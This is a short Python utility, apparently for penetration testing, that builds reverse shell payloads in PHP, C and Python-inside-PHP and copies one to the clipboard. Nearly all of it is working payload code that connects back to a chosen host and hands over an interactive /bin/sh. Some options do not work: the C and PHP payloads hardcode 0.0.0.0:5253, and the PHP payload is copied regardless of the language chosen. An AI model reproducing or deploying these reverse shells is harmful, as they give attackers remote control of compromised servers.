#!/usr/bin/python3

import pyperclip, argparse, sys

parser = argparse.ArgumentParser(description="Copy Reverse Shell Code Straight to Clipboard for Many Languages")
parser.add_argument('-l', '--list', action='store_true', help="list payloads available")
parser.add_argument('--lhost', type=str, help="the machine to callback to")
parser.add_argument('--lport', type=str, help="the port to callback to")
parser.add_argument('-c', '--code', type=int, help="the language the reverse shell should be written in")

if len(sys.argv)==1:
	parser.print_help(sys.stderr)
	sys.exit(1)

args = parser.parse_args()
lhost = args.lhost
lport = args.lport
lang = args.code
list_payloads = args.list

payloads = [str("[0] PHP"), str("[1] C"), str("[2] Python with PHP")]

if list_payloads == True:
	for i in payloads:
		print(i)
	exit()

py_php = str("<?php system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + str(lhost) + "\"," + str(lport) + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'');?>")
c = str("#include <stdio.h>\n#include <unistd.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <sys/types.h>\n#include <sys/socket.h>\nint inet_addr(){};int main(int argc, char *argv[]){struct sockaddr_in sa;int s;sa.sin_family = AF_INET;sa.sin_addr.s_addr = inet_addr(\"0.0.0.0\");sa.sin_port = htons(5253);s = socket(AF_INET, SOCK_STREAM, 0);connect(s, (struct sockaddr *)&sa, sizeof(sa));dup2(s, 0);dup2(s, 1);dup2(s, 2);execve(\"/bin/sh\", 0, 0);return 0;}")
php = str("<?php set_time_limit (0); $ip = '0.0.0.0'; $port = 5253; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = '/bin/sh -i'; $daemon = 0; $debug = 0;  if (function_exists('pcntl_fork')) {         $pid = pcntl_fork();          if ($pid == -1) {                 printit(\"ERROR: Can't fork\");                 exit(1);         }          if ($pid) {                 exit(0);         }          if (posix_setsid() == -1) {                 printit(\"Error: Can't setsid()\");                 exit(1);         }          $daemon = 1; } else {         printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) {         printit(\"$errstr ($errno)\");         exit(1); }  $descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  $process = proc_open($shell, $descriptorspec, $pipes);  if (!is_resource($process)) {         printit(\"ERROR: Can't spawn shell\");         exit(1); }  stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0);  printit(\"Successfully opened reverse shell to $ip:$port\");  while (1) {         if (feof($sock)) {                 printit(\"ERROR: Shell connection terminated\");                 break;         }          if (feof($pipes[1])) {                 printit(\"ERROR: Shell process terminated\");                 break;         }          $read_a = array($sock, $pipes[1], $pipes[2]);         $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);          if (in_array($sock, $read_a)) {                 if ($debug) printit(\"SOCK READ\");                 $input = fread($sock, $chunk_size);                 if ($debug) printit(\"SOCK: $input\");                 fwrite($pipes[0], $input);         }          if (in_array($pipes[1], $read_a)) {                 if ($debug) printit(\"STDOUT READ\");                 $input = fread($pipes[1], $chunk_size);                 if ($debug) printit(\"STDOUT: $input\");                 fwrite($sock, $input);         }          if (in_array($pipes[2], $read_a)) {                 if ($debug) printit(\"STDERR READ\");                 $input = fread($pipes[2], $chunk_size);                 if ($debug) printit(\"STDERR: $input\");                 fwrite($sock, $input);         } }  fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process);  function printit ($string) {         if (!$daemon) {                 print \"$string\n\";         } }  ?>")
pyperclip.copy(php)
